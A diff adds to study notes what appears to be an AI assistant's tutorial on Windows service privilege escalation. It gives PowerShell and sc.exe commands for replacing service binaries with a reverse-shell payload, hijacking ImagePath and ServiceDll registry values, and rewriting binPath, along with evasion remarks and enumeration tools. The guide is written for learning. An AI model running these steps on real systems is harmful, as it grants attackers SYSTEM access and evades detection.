@@ -95,3 +95,233 @@ Persistence techniques are methods used by attackers (or even sysadmins writing 
 ---
 
 In future sections, each of these will be expanded with code samples, detection methods, blue team countermeasures, and how attackers blend in to evade detection. But for now, this is your war map. Choose your battlefield wisely.
+
+Excellent — let’s unpack this topic like a red teamer, a sysadmin, and a detection engineer *all at once*. We’ll go section by section, giving you deep explanations, clear examples, and answers to your current questions:
+
+---
+
+## 🔓 Privilege Escalation via Services – Full Breakdown
+
+---
+
+### 1. **Writable Service Binary (PathName)**
+
+> **If the service executable (the binary) is located in a directory where your user account has write access,** you can replace it with your own EXE and gain SYSTEM privileges when the service starts.
+
+#### 🔧 Example:
+
+Imagine this service:
+
+```powershell
+Get-WmiObject Win32_Service | Where-Object { $_.Name -eq "VulnService" }
+```
+
+Returns:
+
+```
+PathName: C:\Program Files\VulnApp\svc.exe
+StartName: LocalSystem
+```
+
+If you (low-priv user) have write access to `C:\Program Files\VulnApp\svc.exe`:
+
+```powershell
+Copy-Item "C:\Payloads\reverse.exe" "C:\Program Files\VulnApp\svc.exe" -Force
+Start-Service VulnService
+```
+
+✅ Result: **Your payload runs as SYSTEM**
+
+🧠 This works *even if* you can't change the service settings — only file write perms matter.
+
+---
+
+### 2. **Writable Registry Keys → Hijack `ImagePath`**
+
+> If you have permission to modify the service registry key, you can **change the path to the service executable** (ImagePath) to point to your own binary.
+
+#### 🔧 Steps:
+
+1. Find service:
+
+```powershell
+Get-Service | Where-Object { $_.Status -eq "Stopped" }
+```
+
+2. View its registry path:
+
+```powershell
+"HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
+```
+
+3. Replace the binary:
+
+```powershell
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Fax" `
+  -Name "ImagePath" `
+  -Value "C:\Users\Public\reverse.exe"
+```
+
+Then:
+
+```powershell
+Start-Service Fax
+```
+
+> 🧨 This is *dangerous* and **very stealthy** because many tools don’t check service registry paths.
+
+---
+
+### 3. **Service is Stoppable + Restartable**
+
+> Even if you **can’t edit** the binary or registry, if the service **lets you stop and start it**, and the binary is already vulnerable (e.g., writable), **you still win**.
+
+#### Example (PowerUp will flag this):
+
+```powershell
+(Get-WmiObject Win32_Service | Where { $_.Name -eq "PrinterHelper" }).StartName
+```
+
+If it runs as SYSTEM and the service is:
+
+* Stop/start allowed
+* Binary is writeable by `Users`
+
+✅ Replace EXE ➜ restart ➜ SYSTEM shell.
+
+🧠 Abuse comes from **what you can do to the binary or its directory**, not just the registry.
+
+---
+
+## 📌 DLL-Based Service Hijack (Advanced)
+
+### What is it?
+
+Some services **don’t execute an EXE**, but instead load a **DLL** from a defined path.
+
+Registry path:
+
+```
+HKLM\SYSTEM\CurrentControlSet\Services\<Svc>\Parameters\ServiceDll
+```
+
+### Attack:
+
+1. Find one (manually or using `Autoruns`):
+
+```powershell
+Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\AudioSrv\Parameters" | Select ServiceDll
+```
+
+2. Replace the DLL with your own malicious version
+   OR
+   Edit `ServiceDll` path to point to a DLL you control
+
+3. Restart service:
+
+```powershell
+Restart-Service AudioSrv
+```
+
+✅ Result: DLL gets loaded as SYSTEM
+
+> 💣 This works just like EXE hijacking, but stealthier — **fewer tools monitor this path.**
+
+---
+
+## ⚠️ `binPath=` Abuse with `sc.exe`
+
+This is a **classic lateral move** or privilege escalation trick.
+
+### What it does:
+
+It sets the **service binary to run `cmd.exe /c payload.exe`** instead of its original file.
+
+```cmd
+sc.exe config VulnService binPath= "cmd.exe /c C:\temp\reverse.exe"
+sc.exe start VulnService
+```
+
+✅ SYSTEM shell via `reverse.exe`
+
+> The `cmd.exe /c` allows any command to run — often used to **execute PowerShell one-liners, downloaders, or open calc.exe** to prove access.
+
+🔒 Watch out: **Defenders log `binPath` changes if they're smart.**
+
+---
+
+## ⚖️ PowerShell `Set-Service` vs `sc.exe`
+
+### Which should you learn?
+
+| Feature                    | `Set-Service` | `sc.exe`     |
+| -------------------------- | ------------- | ------------ |
+| Built into PowerShell      | ✅             | ❌ (external) |
+| Modify StartupType         | ✅             | ✅            |
+| Modify ImagePath           | ❌             | ✅            |
+| Change Recovery Options    | ❌             | ✅            |
+| Create/delete service      | ✅             | ✅            |
+| Works even when PS blocked | ❌             | ✅            |
+
+### Verdict:
+
+✅ **Learn both.**
+
+* Use `Set-Service` for scripts and automation
+* Use `sc.exe` for registry-level control and persistence tricks
+* `sc.exe` is more powerful but **more suspicious if logged**
+
+---
+
+## 🛠️ Tools for Enumerating Weak Services
+
+### 1. **PowerUp.ps1**
+
+```powershell
+Invoke-AllChecks
+```
+
+* Finds:
+
+  * Writable binaries
+  * Writable service keys
+  * Unquoted paths
+  * Registry hijack vectors
+
+---
+
+### 2. **AccessChk.exe**
+
+```cmd
+accesschk.exe -uwcqv "Users" *
+```
+
+🔍 Breakdown:
+
+* `-u`: user
+* `-w`: only show writeable
+* `-c`: container objects (services)
+* `-qv`: quiet verbose
+* `"Users"`: group to scan
+* `*`: check all services
+
+This checks **which services your current user can write to** or control.
+
+---
+
+### 3. **WinPEAS.exe**
+
+* GUI/console tool that finds:
+
+  * Service misconfigs
+  * Permission issues
+  * Path weaknesses
+  * Hijackable locations
+
+> 🧠 Always run WinPEAS and PowerUp together — they find different things.
+
+---
+
+## 🧠 You Asked About `Get-WmiObject`
+
+Your current notes are good — here’s what you’re missing:
